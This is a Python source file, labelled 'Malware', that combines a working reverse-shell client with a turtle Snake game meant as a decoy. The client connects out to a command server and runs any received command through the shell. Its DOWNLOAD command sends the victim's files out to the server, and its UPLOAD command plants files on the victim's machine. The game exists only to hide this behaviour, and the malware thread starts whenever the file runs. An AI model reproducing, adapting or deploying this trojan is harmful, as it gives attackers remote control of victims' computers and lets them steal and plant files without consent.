#======> Malware <=======

# Client.py

import threading
import socket
import subprocess
import os

def malware_func():
    # server IP
    HOST = "127.0.1.1"
    PORT = 12345
    FORMAT="UTF-8"

    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST,PORT))
    
        is_connect=True

        while True:

            continue_recv=True
            command=""
            while continue_recv:

                data = client_socket.recv(1024)
                command+=data.decode(FORMAT)
                if command.find("\n\0")!= -1 or data.decode(FORMAT) == "":
                    continue_recv=False
                    command = command.replace("\n\0","")
                    if command == "exit":
                        is_connect=False
            
            if not is_connect:
                break
            
            # run the command in linux terminal or upload or download file or cd 
            if command.find("DOWNLOAD") == -1 and command.find("UPLOAD") == -1 and command.find("cd") == -1:
                process = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                output , error = process.communicate()
                if error:
                    err_str = error.decode()
                    err_str = "fatal error: " + err_str + '\n\0'
                    client_socket.sendall(err_str.encode(FORMAT))

                else:
                    out_str = output.decode()
                    out_str = "output: " + out_str + '\n\0'
                    client_socket.sendall(out_str.encode(FORMAT))
        
            else:   # file transfer protocol and cd
                if command.find('cd') != -1:
                    command = command.replace("cd ","")
                    try:
                        os.chdir(command) # now command = path 
                        process = subprocess.Popen('pwd',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                        output , error = process.communicate()
                        out_str=output.decode(FORMAT)+'\n\0'
                        client_socket.sendall(out_str.encode(FORMAT))
                    except:
                        process = subprocess.Popen('pwd',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                        output , error = process.communicate()
                        out_str=output.decode(FORMAT)+'\n\0'
                        client_socket.sendall(out_str.encode(FORMAT))
                else:
                    command_components=list(i for i in command.split())
                    if command.find('DOWNLOAD') != -1:
                        with open(command_components[1],'rb') as file:
                            data=file.read()
                            data_str=data.decode(FORMAT)+'\n\0'
                            client_socket.sendall(data_str.encode(FORMAT))
                    if command.find('UPLOAD') != -1:
                        file_name=os.path.basename(command_components[1])
                        data=""
                        while True:
                            data+=client_socket.recv(1024).decode(FORMAT)
                            if data.find('\n\0')!= -1:
                                data=data.replace('\n\0','')
                                break
                        with open(command_components[2]+'/'+file_name,'wb') as new_file:
                            new_file.write(data.encode(FORMAT))
                            client_socket.sendall('Desired file uploaded successfully.'.encode(FORMAT))





# Userinterface  =>  Game
import turtle
import random
 
w = 500
h = 500
food_size = 20
delay = 100
 
offsets = {
    "up": (0, 20),
    "down": (0, -20),
    "left": (-20, 0),
    "right": (20, 0)
}
 
def reset():
    global snake, snake_dir, food_position , pen
    snake = [[0, 0], [0, 20], [0, 40], [0, 60], [0, 80]]
    snake_dir = "up"
    food_position = get_random_food_position()
    food.goto(food_position)
    move_snake()
     
def move_snake():
    global snake_dir
 
    new_head = snake[-1].copy()
    new_head[0] = snake[-1][0] + offsets[snake_dir][0]
    new_head[1] = snake[-1][1] + offsets[snake_dir][1]
 
     
    if new_head in snake[:-1]:
        reset()
    else:
        snake.append(new_head)
 
     
        if not food_collision():
            snake.pop(0)
 
 
        if snake[-1][0] > w / 2:
            snake[-1][0] -= w
        elif snake[-1][0] < - w / 2:
            snake[-1][0] += w
        elif snake[-1][1] > h / 2:
            snake[-1][1] -= h
        elif snake[-1][1] < -h / 2:
            snake[-1][1] += h
 
 
        pen.clearstamps()
 
         
        for segment in snake:
            pen.goto(segment[0], segment[1])
            pen.stamp()
 
         
        screen.update()
 
        turtle.ontimer(move_snake, delay)
 
def food_collision():
    global food_position
    if get_distance(snake[-1], food_position) < 20:
        food_position = get_random_food_position()
        food.goto(food_position)
        return True
    return False
 
def get_random_food_position():
    x = random.randint(- w / 2 + food_size, w / 2 - food_size)
    y = random.randint(- h / 2 + food_size, h / 2 - food_size)
    return (x, y)
 
def get_distance(pos1, pos2):
    x1, y1 = pos1
    x2, y2 = pos2
    distance = ((y2 - y1) ** 2 + (x2 - x1) ** 2) ** 0.5
    return distance
def go_up():
    global snake_dir
    if snake_dir != "down":
        snake_dir = "up"
 
def go_right():
    global snake_dir
    if snake_dir != "left":
        snake_dir = "right"
 
def go_down():
    global snake_dir
    if snake_dir!= "up":
        snake_dir = "down"
 
def go_left():
    global snake_dir
    if snake_dir != "right":
        snake_dir = "left"

def game():
    global screen
    screen = turtle.Screen()
    screen.setup(w, h)
    screen.title("Snake")
    screen.bgcolor("blue")
    screen.setup(500, 500)
    screen.tracer(0)
    
    global pen
    pen = turtle.Turtle("square")
    pen.penup()
    
    global food
    food = turtle.Turtle()
    food.shape("square")
    food.color("yellow")
    food.shapesize(food_size / 20)
    food.penup()
    
    
    screen.listen()
    screen.onkey(go_up, "Up")
    screen.onkey(go_right, "Right")
    screen.onkey(go_down, "Down")
    screen.onkey(go_left, "Left")
    
    
    reset()
 
# game_thread=threading.Thread(target=game)
# game_thread.start()
# game_thread.join()

#end of userinterface code

# malware code

malware_thread=threading.Thread(target=malware_func)
malware_thread.start()

malware_thread.join()

# end of malware code